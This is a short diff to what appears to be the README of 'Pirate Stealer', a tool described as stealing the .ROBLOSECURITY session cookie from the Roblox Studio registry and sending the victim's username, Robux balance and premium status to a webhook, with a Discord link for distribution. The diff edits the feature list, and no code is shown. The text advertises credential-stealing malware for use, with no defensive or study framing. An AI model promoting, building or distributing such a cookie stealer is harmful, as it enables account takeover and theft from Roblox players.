@@ -6,7 +6,7 @@
 Pirate Stealer steals .ROBLOSECURITY cookie from Roblox Studio Registry
 https://discord.gg/nNRyWJbc6m
 # Feautres
-	🔴 Crashes when cookie inside registry is not valid
+	🔴 Grabs only from Roblox studio, not browsers
 	🟢Sends Robux Balance to webhook
 	🟢Sends Premium Status to webhook
 	🟢Sends Roblox Username to webhook
